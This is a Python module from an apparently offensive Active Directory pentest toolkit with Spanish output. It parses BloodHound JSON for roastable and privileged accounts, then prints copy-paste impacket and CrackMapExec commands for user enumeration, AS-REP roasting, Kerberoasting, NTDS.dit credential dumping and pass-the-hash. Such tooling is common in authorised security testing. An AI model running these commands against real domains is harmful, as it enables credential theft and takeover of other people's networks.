import json
import os

class Colors:
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def analyze_bloodhound_data(file_path):
    print(f"{Colors.OKCYAN}[*] Analizando archivo BloodHound: {file_path}{Colors.ENDC}")
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
            
        users = data.get('data', [])
        if not users:
            print(f"{Colors.WARNING}[-] No se encontraron datos de usuarios en el JSON.{Colors.ENDC}")
            return

        asrep_vulnerable = []
        kerberoast_vulnerable = []
        admins = []

        for user in users:
            props = user.get('Properties', {})
            name = props.get('name', 'Desconocido')
            
            # Chequeos de vulnerabilidades comunes de AD en las propiedades
            if props.get('dontreqpreauth', False):
                asrep_vulnerable.append(name)
            if props.get('hasspn', False):
                kerberoast_vulnerable.append(name)
            if props.get('admincount', False) == True:
                admins.append(name)

        print(f"\n{Colors.BOLD}--- RESULTADOS DEL ANÁLISIS AUTOMÁTICO ---{Colors.ENDC}")
        
        from core import db

        if asrep_vulnerable:
            print(f"\n{Colors.FAIL}[!] VULNERABILIDAD CRÍTICA: AS-REP Roasting Posible{Colors.ENDC}")
            print(f"{Colors.WARNING}Los siguientes usuarios tienen DONT_REQ_PREAUTH habilitado. Puedes obtener su hash sin contraseña.{Colors.ENDC}")
            for u in asrep_vulnerable:
                print(f"  -> {u}")
                db.add_ad_finding("Dominio", "AS-REP Roasting", u)
        else:
            print(f"\n{Colors.OKGREEN}[+] No se encontraron usuarios vulnerables a AS-REP.{Colors.ENDC}")

        if kerberoast_vulnerable:
            print(f"\n{Colors.FAIL}[!] VULNERABILIDAD CRÍTICA: Kerberoasting Posible{Colors.ENDC}")
            print(f"{Colors.WARNING}Los siguientes usuarios tienen SPNs. Si consigues una cuenta de bajos privilegios, puedes robar el ticket de estos servicios.{Colors.ENDC}")
            for u in kerberoast_vulnerable:
                print(f"  -> {u}")
                db.add_ad_finding("Dominio", "Kerberoasting", u)
                
        if admins:
            print(f"\n{Colors.OKCYAN}[*] Usuarios marcados con AdminCount=1 (Objetivos de Alto Valor):{Colors.ENDC}")
            for u in admins:
                print(f"  -> {u}")
                db.add_ad_finding("Dominio", "Admin Privilegiado", u)

    except FileNotFoundError:
        print(f"{Colors.FAIL}[-] Error: Archivo {file_path} no encontrado.{Colors.ENDC}")
    except (json.JSONDecodeError, UnicodeDecodeError):
        print(f"{Colors.FAIL}[-] Error: El archivo no es un texto JSON válido o es un archivo binario corrupto.{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.FAIL}[-] Error inesperado analizando JSON: {e}{Colors.ENDC}")


def run(dc_ip, domain, parse_file=None):
    if parse_file:
        analyze_bloodhound_data(parse_file)
        return

    print(f"{Colors.OKCYAN}[*] Iniciando módulo AD-Core contra DC: {dc_ip} (Dominio: {domain}){Colors.ENDC}")
    print(f"\n{Colors.WARNING}--- Comandos Listos para Copiar y Pegar (Impacket & Kerbrute) ---{Colors.ENDC}")
    
    print(f"\n{Colors.OKGREEN}[1] Enumerar Usuarios con sesión nula (SMB/RPC):{Colors.ENDC}")
    print(f"    rpcclient -U '' -N {dc_ip} -c enumdomusers")
    print(f"    crackmapexec smb {dc_ip} -u '' -p '' --users")
    
    print(f"\n{Colors.OKGREEN}[2] AS-REP Roasting (Ataque sin credenciales, requiere lista de usuarios):{Colors.ENDC}")
    print(f"    impacket-GetNPUsers {domain}/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip {dc_ip}")
    
    print(f"\n{Colors.OKGREEN}[3] Kerberoasting (Ataque con usuario comprometido de bajos privilegios):{Colors.ENDC}")
    print(f"    impacket-GetUserSPNs {domain}/user:password -request -dc-ip {dc_ip} -outputfile kerberoast.txt")
    
    print(f"\n{Colors.OKGREEN}[4] BloodHound (Ingestor Python para mapear caminos a Domain Admin):{Colors.ENDC}")
    print(f"    bloodhound-python -u user -p password -ns {dc_ip} -d {domain} -c all")
    print(f"    {Colors.WARNING}Una vez tengas el users.json, analízalo con: Farei_0x.py ad {dc_ip} {domain} --parse users.json{Colors.ENDC}")
    
    print(f"\n{Colors.OKGREEN}[5] Dumpear NTDS.dit (Si ya eres Domain Admin / tienes DCSync):{Colors.ENDC}")
    print(f"    impacket-secretsdump {domain}/admin:password@{dc_ip}")
    
    print(f"\n{Colors.OKGREEN}[6] Pass-The-Hash (Ejecutar comandos con el hash NTLM):{Colors.ENDC}")
    print(f"    impacket-psexec {domain}/admin@10.10.10.10 -hashes :<HASH_NTLM>")
